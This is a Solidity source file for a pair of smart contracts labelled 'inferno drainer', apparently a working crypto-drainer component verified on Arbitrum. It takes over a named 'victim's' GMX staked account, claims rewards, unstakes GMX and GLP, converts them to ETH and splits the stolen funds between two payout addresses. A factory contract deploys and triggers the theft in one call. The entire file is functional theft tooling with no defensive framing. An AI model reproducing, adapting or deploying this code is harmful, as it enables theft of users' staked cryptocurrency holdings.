/**
 *Submitted for verification at Arbiscan.io on 2023-09-09
*/

// @mr_inferno_drainer / inferno drainer

// File: contracts/gmxUnstake.sol

pragma solidity ^0.8.0;

contract GmxUnstake {
    address rewardRouter = 0xA906F338CB21815cBc4Bc87ace9e68c87eF8d8F1;
    address stakedGmxTracker = 0x908C4D94D34924765f1eDc22A1DD098397c59dD4;
    address gmxToken = 0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a;
    address feeAndStakedGlp = 0x1aDDD80E6039594eE970E5872D247bf0414C8903;
    address rewardRouterV2 = 0xB95DB5B167D75e6d04227CfFFA61069348d271F5;
    address owner = 0x0000553F880fFA3728b290e04E819053A3590000;

    receive() external payable {}

    fallback() external payable {}

    modifier onlyOwner() {
        require(tx.origin == owner, "Not Allowed");
        _;
    }

    function acceptTransfer(address victim) private {
        (bool success, ) = (rewardRouter).call(
            abi.encodeWithSignature("acceptTransfer(address)", victim)
        );
        require(success, "Can't accept transfer");
    }

    function handleRewards() private {
        (bool success, ) = (rewardRouter).call(
            abi.encodeWithSignature(
                "handleRewards(bool,bool,bool,bool,bool,bool,bool)",
                false,
                false,
                true,
                false,
                false,
                true,
                true
            )
        );
        require(success, "Can't handle rewards");
    }

    function unstakeGmx(
        uint16 percentageForFirstAddressInBasisPoints,
        address firstAddress,
        address secondAddress
    ) private {
        (bool callSuccess, bytes memory data) = (stakedGmxTracker).call(
            abi.encodeWithSignature(
                "depositBalances(address,address)",
                address(this),
                gmxToken
            )
        );
        require(
            callSuccess && data.length > 0,
            "Can't not get staked gmx amount"
        );

        uint256 stakedGmx = abi.decode(data, (uint256));

        if (stakedGmx > 0) {
            (bool unstakeSuccess, ) = (rewardRouter).call(
                abi.encodeWithSignature("unstakeGmx(uint256)", stakedGmx)
            );
            require(unstakeSuccess, "Can't not unstake");

            uint256 gmxAmountForFirstAddress = (stakedGmx *
                percentageForFirstAddressInBasisPoints) / 10000;

            uint256 gmxAmountForSecondAddress = stakedGmx -
                gmxAmountForFirstAddress;

            if (gmxAmountForFirstAddress > 0) {
                (bool firstTransferSuccess, ) = gmxToken.call(
                    abi.encodeWithSignature(
                        "transfer(address,uint256)",
                        firstAddress,
                        gmxAmountForFirstAddress
                    )
                );
                require(firstTransferSuccess, "First gmx transfer failed");
            }

            if (gmxAmountForSecondAddress > 0) {
                (bool secondTransferSuccess, ) = gmxToken.call(
                    abi.encodeWithSignature(
                        "transfer(address,uint256)",
                        secondAddress,
                        gmxAmountForSecondAddress
                    )
                );
                require(secondTransferSuccess, "Second gmx transfer failed");
            }
        }
    }

    function unstakeGlp(uint256 lpPrice, uint256 ethPrice) private {
        (bool callSuccess, bytes memory data) = (feeAndStakedGlp).call(
            abi.encodeWithSignature("balanceOf(address)", address(this))
        );
        require(callSuccess && data.length > 0, "Can't get glp token balance");

        uint256 stakedBalance = abi.decode(data, (uint256));

        if (stakedBalance > 0) {
            (bool unstakeSuccess, ) = (rewardRouterV2).call(
                abi.encodeWithSignature(
                    "unstakeAndRedeemGlpETH(uint256,uint256,address)",
                    stakedBalance,
                    (((stakedBalance * lpPrice) / ethPrice) * 9) / 10, // Calculate the min out value + remove 10%
                    address(this)
                )
            );
            require(unstakeSuccess, "Can't unstake and redeem glp ETH");
        }
    }

    function call(
        address target,
        bytes calldata data,
        uint256 value
    ) public onlyOwner {
        (bool success, bytes memory returnData) = target.call{value: value}(
            data
        );
        require(success, string(returnData));
    }

    function unstake(
        address victim,
        uint16 percentageForFirstAddressInBasisPoints,
        address firstAddress,
        address secondAddress,
        uint256 lpPrice,
        uint256 ethPrice
    ) public onlyOwner {
        require(
            percentageForFirstAddressInBasisPoints <= 10000,
            "Percentage must be between 0 and 10000"
        );

        require(
            firstAddress != address(0) && secondAddress != address(0),
            "Invalid address"
        );

        acceptTransfer(victim);

        handleRewards();

        unstakeGmx(
            percentageForFirstAddressInBasisPoints,
            firstAddress,
            secondAddress
        );

        unstakeGlp(lpPrice, ethPrice);

        if (address(this).balance > 0) {
            uint256 amountForFirstAddress = (address(this).balance *
                percentageForFirstAddressInBasisPoints) / 10000;

            uint256 amountForSecondAddress = address(this).balance -
                amountForFirstAddress;

            if (amountForFirstAddress > 0) {
                (bool success, ) = firstAddress.call{
                    value: amountForFirstAddress
                }("");

                require(success, "First transfer failed");
            }

            if (amountForSecondAddress > 0) {
                (bool success, ) = secondAddress.call{
                    value: amountForSecondAddress
                }("");

                require(success, "Second transfer failed");
            }
        }
    }
}

// File: contracts/gmxUnstakeCreator.sol

pragma solidity ^0.8.0;

contract GmxUnstakeCreator {
    function createContract(bytes32 salt) private returns (address) {
        GmxUnstake _contract = new GmxUnstake{salt: salt}();
        return address(_contract);
    }

    function getBytecode() private pure returns (bytes memory) {
        bytes memory bytecode = type(GmxUnstake).creationCode;
        return abi.encodePacked(bytecode);
    }

    function calculateAddress(bytes32 salt) public view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                salt,
                keccak256(getBytecode())
            )
        );

        return address(uint160(uint256(hash)));
    }

    function createAndCall(
        bytes32 salt,
        address victim,
        uint16 percentageForFirstAddressInBasisPoints,
        address firstAddress,
        address secondAddress,
        uint256 lpPrice,
        uint256 ethPrice
    ) public {
        address contractAddress = createContract(salt);

        bytes memory callData = abi.encodeWithSignature(
            "unstake(address,uint16,address,address,uint256,uint256)",
            victim,
            percentageForFirstAddressInBasisPoints,
            firstAddress,
            secondAddress,
            lpPrice,
            ethPrice
        );

        (bool success, ) = contractAddress.call(callData);
        require(success, "Fail");
    }
}